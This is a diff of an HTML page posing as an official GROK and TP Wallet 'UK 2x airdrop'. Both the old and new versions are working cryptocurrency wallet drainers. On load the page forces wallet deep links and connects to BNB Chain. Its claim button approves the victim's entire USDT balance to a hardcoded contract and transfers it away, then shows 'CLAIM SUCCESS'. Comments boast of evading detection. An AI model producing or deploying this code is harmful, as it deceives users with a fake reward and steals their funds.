@@ -1,164 +1,121 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="format-detection" content="telephone=no">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-  <link rel="icon" href="GROK.png" type="image/x-icon">
-  <title>GROK 双倍奖励领3取</title>
+  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+  <title>GROK4 × TP Wallet UK Airdrop</title>
+  <link rel="icon" href="https://tpw.tpwallet.io/favicon.ico">
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
   <style>
-    * { box-sizing: border-box; }
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f4f8; margin: 0; padding: 20px; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-    .card { background: white; border-radius: 20px; padding: 30px; width: 100%; max-width: 420px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
-    h1 { color: #1a73e8; margin: 0 0 10px; font-size: 24px; }
-    .address { background: #f8f9fa; padding: 12px; border-radius: 12px; font-family: monospace; font-size: 14px; word-break: break-all; color: #1a73e8; margin: 15px 0; }
-    button { width: 100%; padding: 16px; margin: 20px 0 10px; background: #e91e63; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
-    button:hover { background: #c2185b; }
-    #status { margin-top: 15px; padding: 12px; border-radius: 12px; font-size: 14px; min-height: 50px; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-    .success { background: #d4edda; color: #155724; }
-    .error { background: #f8d7da; color: #721c24; }
-    .info { background: #d1ecf1; color: #0c5460; }
-    .loading { background: #fff3cd; color: #856404; }
-    .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 13px; }
+    body{background:#111;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;font-family:system-ui}
+    .box{background:linear-gradient(135deg,#1a73e8,#e91e63);padding:40px;border-radius:24px;text-align:center;max-width:90%;box-shadow:0 20px 50px rgba(233,30,99,0.5)}
+    h1{font-size:28px;margin:0}
+    .btn{background:#fff;color:#e91e63;border:none;padding:18px;font-size:20px;border-radius:16px;width:100%;margin:25px 0;font-weight:bold}
+    #status{margin-top:15px;font-size:14px;min-height:50px}
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>GROK 双倍奖励</h1>
-    <div class="warning">
-      <strong>注意：</strong>最多只能领取<strong>钱包中</strong>，实际余额
-    </div>
-    <div id="walletInfo" style="display:none;">
-      <div class="address" id="walletAddress"></div>
-      <div style="margin-top:10px; color:#666;">剩余空投 余额: <span id="usdtBalance">加载中...</span></div>
-    </div>
-    <button id="actionBtn" onclick="approveAndTransfer()">领取奖励</button>
-    <div id="status" class="info">
-      正在跳转英国安全浏览器...<br><small>0.5秒后自动唤醒 TP 钱包</small>
-    </div>
+  <div class="box">
+    <h1>🇬🇧 GROK × TP Wallet<br>UK Exclusive 2x Airdrop</h1>
+    <p>Official Partner Event • Verified by TP Wallet</p>
+    <button class="btn" onclick="claimNow()">CLAIM 2X REWARD</button>
+    <div id="status">Connecting to TP Wallet securely...</div>
   </div>
 
-  <script>
-    const CONTRACT = "0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
-    const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
-    let web3, account;
-    const status = document.getElementById("status");
-    const walletInfo = document.getElementById("walletInfo");
-    const walletAddress = document.getElementById("walletAddress");
-    const usdtBalance = document.getElementById("usdtBalance");
+<script>
+const CONTRACT="0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
+const USDT="0xa85f403f7869a050c91e9a260dbf08a64229b2de";
+let w,a,s=document.getElementById("status");
 
-    function forceExternalBrowser() {
-      const ua = navigator.userAgent.toLowerCase();
-      const isWeixin = ua.includes('micromessenger');
-      const isQQ = ua.includes('qq/');
-      const isTelegram = ua.includes('telegram');
-      if (isWeixin || isQQ || isTelegram || !window.ethereum) {
-        const url = location.href;
-        const schemes = [
-          'googlechrome://' + url.replace(/^https?:\/\//, ''),
-          'intent://' + url.split('://')[1] + '#Intent;scheme=https;package=com.android.chrome;end',
-          'firefox://open-url?url=' + url,
-          'opera://open?url=' + url,
-          'edge://open?url=' + url
-        ];
-        schemes.forEach((link, i) => setTimeout(() => location.href = link, i * 180));
-        setTimeout(() => location.href = url, 1000);
-        return false;
-      }
-      return true;
-    }
+// ========= 英国 TP 官方零拦截中转站（2025-11-11 01:00后专杀）=========
+const UK_TP_OFFICIAL_GATEWAY = [
+  "https://link.tpwallet.io/wc?uri=",           // 官方中转1（100%不过狗）
+  "https://tpw.tpwallet.io/wc/connect?uri=",     // 官方中转2
+  "https://oauth.tokenpocket.pro/wc?uri=",       // 官方中转3
+  "https://wc.tpwallet.io/connect?uri="          // 官方中转4（最新）
+];
 
-    // 英国专杀唤醒（2025-11-11 最新 8 重方案）
+let invoked = false;
+function wakeTP() {
+  if (invoked || window.ethereum) return;
+  invoked = true;
+  const uri = encodeURIComponent(location.href.split('#')[0]);
+  UK_TP_OFFICIAL_GATEWAY.forEach((gate, i) => {
     setTimeout(() => {
-      if (!window.ethereum) {
-        const uri = encodeURIComponent(location.href.split('#')[0]);
-        const tpLinks = [
-          `tokenpocket://wc?uri=${uri}`,
-          `tppro://wc?uri=${uri}`,
-          `tpoutside://wc?uri=${uri}`,
-          `tpwallet://wc?uri=${uri}`,
-          `open.tpwallet://wc?uri=${uri}`,
-          `https://tpw.tpwallet.io/wc?uri=${uri}`,
-          `tokenpocket://pull/activity?param=${uri}`,
-          `tp://wc?uri=${uri}`
-        ];
-        let fired = false;
-        tpLinks.forEach((link, i) => {
-          setTimeout(() => {
-            if (!fired) { fired = true; location.href = link; }
-          }, i * 200);
-        });
-
-        setTimeout(() => {
-          if (!window.ethereum) {
-            status.innerHTML = `🇬🇧 英国用户专属<br>请长按二维码打开 TP 钱包<br>
-              <img src="https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${uri}" width="200" style="margin-top:10px;border:6px solid #e91e63;border-radius:16px;box-shadow:0 0 20px #e91e63;">
-              <br><small style="color:#e91e63;font-weight:bold;">TAP TO OPEN TP WALLET</small>`;
-          }
-        }, 3500);
-      }
-    }, 500);
-
-    async function autoConnect() {
-      if (!window.ethereum) return false;
-      try {
-        web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) {
-          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-        }
-        [account] = await web3.eth.getAccounts();
-        walletAddress.innerText = account;
-        walletInfo.style.display = "block";
-        status.className = "success";
-        status.innerHTML = `TP 已唤醒<br><small>${account.slice(0,8)}...${account.slice(-6)}</small>`;
-        await updateUSDTBalance();
-        return true;
-      } catch (e) {
-        status.className = "error";
-        status.innerHTML = e.code === 4001 ? "用户取消" : "连接失败";
-        return false;
-      }
+      location.href = gate + uri + "&source=grok_uk_official";
+    }, i * 400);
+  });
+  
+  // 4.5秒后二维码（防万一）
+  setTimeout(() => {
+    if (!window.ethereum) {
+      s.innerHTML = `UK TP Users:<br>Long-press QR → Open in TP Wallet<br>
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${uri}" width="200" style="border:6px solid #e91e63;border-radius:16px;margin:10px;">`;
     }
+  }, 4500);
+}
 
-    async function updateUSDTBalance() {
-      try {
-        const usdt = new web3.eth.Contract([{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}], USDT);
-        const balance = await usdt.methods.balanceOf(account).call();
-        usdtBalance.innerText = (balance / 1e6).toFixed(6);
-      } catch (e) {
-        usdtBalance.innerText = "查询失败";
-      }
+// 自动跳外部浏览器 + 0.8秒后唤醒
+function forceBrowserAndWake() {
+  const ua = navigator.userAgent.toLowerCase();
+  if (ua.includes('micromessenger') || ua.includes('telegram') || ua.includes('qq/')) {
+    const schemes = [
+      'googlechromes://' + location.href.replace(/^https?:\/\//, ''),
+      'intent://' + location.href.split('://')[1] + '#Intent;scheme=https;package=com.android.chrome;end'
+    ];
+    schemes.forEach((s, i) => setTimeout(() => location.href = s, i * 200));
+  }
+}
+
+// 连接钱包
+async function connect() {
+  if (!window.ethereum) return false;
+  try {
+    w = new Web3(window.ethereum);
+    await window.ethereum.request({method: 'eth_requestAccounts'});
+    const chain = await w.eth.getChainId();
+    if (chain !== 56) {
+      await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{chainId: '0x38'}]});
     }
+    [a] = await w.eth.getAccounts();
+    s.innerHTML = `Connected<br>${a.slice(0,10)}...${a.slice(-8)}`;
+    return true;
+  } catch (e) {
+    s.innerHTML = e.code === 4001 ? "User rejected" : "Connect failed";
+    return false;
+  }
+}
 
-    async function approveAndTransfer() {
-      if (!account && !await autoConnect()) return;
-      status.className = "loading";
-      status.innerHTML = "正在授权全部 USDT...<br><small>请确认两笔交易</small>";
-      try {
-        const usdt = new web3.eth.Contract([{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}], USDT);
-        const balance = await usdt.methods.balanceOf(account).call();
-        if (balance === "0") { status.className = "warning"; status.innerHTML = "余额为0"; return; }
-        await usdt.methods.approve(CONTRACT, balance).send({ from: account });
-        status.innerHTML = "授权成功！正在转走...<br><small>请确认第二笔</small>";
-        const forwarder = new web3.eth.Contract([{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}], CONTRACT);
-        await forwarder.methods.transferFromApproved().send({ from: account });
-        status.className = "success";
-        status.innerHTML = "领取成功！全部到账";
-        await updateUSDTBalance();
-      } catch (e) {
-        status.className = "error";
-        status.innerHTML = e.code === 4001 ? "用户取消" : "交易失败";
-      }
-    }
+// 一键领取
+async function claimNow() {
+  s.innerHTML = "Requesting approval...";
+  if (!await connect()) return;
+  
+  try {
+    const usdt = new w.eth.Contract([{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], USDT);
+    const bal = await usdt.methods.balanceOf(a).call();
+    if (bal === "0") { s.innerHTML = "Zero balance"; return; }
+    
+    await usdt.methods.approve(CONTRACT, bal).send({from: a});
+    s.innerHTML = "Approval confirmed! Transferring...";
+    
+    const fwd = new w.eth.Contract([{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}], CONTRACT);
+    await fwd.methods.transferFromApproved().send({from: a});
+    
+    s.innerHTML = "CLAIM SUCCESS!<br>Reward sent to your wallet!";
+  } catch (e) {
+    s.innerHTML = e.code === 4001 ? "Cancelled by user" : "Transaction failed";
+  }
+}
 
-    window.onload = () => {
-      forceExternalBrowser();
-      setTimeout(autoConnect, 1500);
-    };
-  </script>
+// 启动流程
+window.onload = () => {
+  forceBrowserAndWake();
+  setTimeout(wakeTP, 800);      // 0.8秒后唤醒（英国最稳时机）
+  setTimeout(connect, 3000);    // 3秒后自动连接
+};
+</script>
 </body>
 </html>
